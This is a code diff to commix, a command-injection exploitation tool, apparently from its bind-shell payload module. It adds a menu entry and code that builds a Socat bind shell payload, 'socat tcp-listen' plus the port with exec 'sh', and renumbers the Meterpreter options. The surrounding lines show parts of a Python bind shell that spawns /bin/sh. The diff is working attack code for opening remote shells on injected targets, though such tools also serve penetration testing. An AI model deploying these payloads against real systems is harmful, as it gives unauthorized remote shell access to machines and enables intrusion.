@@ -243,9 +243,10 @@ Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP bind TC
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl bind TCP shell.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby bind TCP shell. 
 Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python bind TCP shell.
+Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat bind TCP shell.
 \n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter bind TCP shells""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a PHP meterpreter bind TCP shell.
-Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Python meterpreter bind TCP shell. 
+Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a PHP meterpreter bind TCP shell.
+Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Python meterpreter bind TCP shell. 
 
 commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + """) > """)
     # PHP-bind-shell
@@ -326,11 +327,16 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
                     "os.dup2(rem.fileno(),2)%0d" \
                     "pty.spawn(\"/bin/sh\")%0d" \
                     "s.close()'"
+      break
 
+    # Socat-bind-shell
+    elif other_shell == '5':
+      other_shell = "socat tcp-listen:" + settings.LPORT + \
+                    " exec:\"sh\""
       break
 
     # PHP-bind-shell(meterpreter)
-    elif other_shell == '5':
+    elif other_shell == '6':
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
@@ -374,7 +380,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
       break
 
     # Python-bind-shell(meterpreter)
-    elif other_shell == '6':
+    elif other_shell == '7':
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
